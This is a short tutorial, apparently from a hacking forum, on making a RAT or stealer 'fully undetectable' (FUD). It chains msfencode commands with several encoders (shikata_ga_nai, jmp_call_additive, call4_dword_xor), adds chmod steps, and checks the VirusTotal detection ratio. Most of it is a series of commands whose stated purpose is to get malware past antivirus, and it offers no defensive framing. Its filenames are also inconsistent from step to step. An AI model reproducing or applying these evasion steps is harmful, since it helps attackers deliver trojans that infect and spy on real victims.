How to FUD a RAT stub with
Backtrack
Requirements:-
1. Backtrack Operating System
2. MSF encoders
So, our first step is to create a virus
file with any of the tools like RAT,
stealers, botnets, payload or
anything. To make it FUD (Fully
Undetectable), we use backtrack.
Before going to FUD check your file
with ant viruses at virustotal.com
and we get a detection ratio for
example lets say 30/44
Now start terminal in Backtrack and
navigate to the directory where your
file is located.
E.g. cd Desktop
So our first step is to change the
permissions of that file (775) by
typing this command
root@bt:~/Desktop# chmod 775
stub.exe
Further type this command to encode
your virus,
root@bt:~/Desktop# msfencode -i /
root/Desktop/Server.exe -t raw -o
/root/Desktop/stub2.exe -e x86/
shikata_ga_nai -c 10
You’ll notice Antivirus still detected it
even though we encoded it 10 times
with
“x86/shikata_ga_nai” encoder.
Now again change the permissions of
this output file,
root@bt:~/Desktop# chmod 775
server2.exe
Now 2nd time, we use another
encoder named as “jmp_call_addit
ive”
root@bt:~/Desktop# msfencode -i /
root/Desktop/Server2.exe -t raw -o
/root/Desktop/Server3.exe -e x86/
jmp_call_additive -c 1
Now again change the permissions of
this output file,
root@bt:~/Desktop# chmod 775
server3.exe
Now again we use another encoder
named as “call4_dword_xor”
root@bt:~/Desktop# msfencode -i /
root/Desktop/Server3.exe -t raw -o
/root/Desktop/Server4.exe -e x86/
call4_dword_xor -c 1
Now again change the permissions of
this output file,
root@bt:~/Desktop# chmod 775
server4.exe
Now final we encode again with this
encoder “shikata_ga_nai”
root@bt:~/Desktop# msfencode -i /
root/Desktop/Server4.exe -o
/root/Desktop/final.exe -e x86/
shikata_ga_nai -c 1
Now again change the permissions of
this output file,
root@bt:~/Desktop# chmod 775
final.exe
Now you'll get a final.exe, upload it to
virustotal.com and you’ll see the
results...
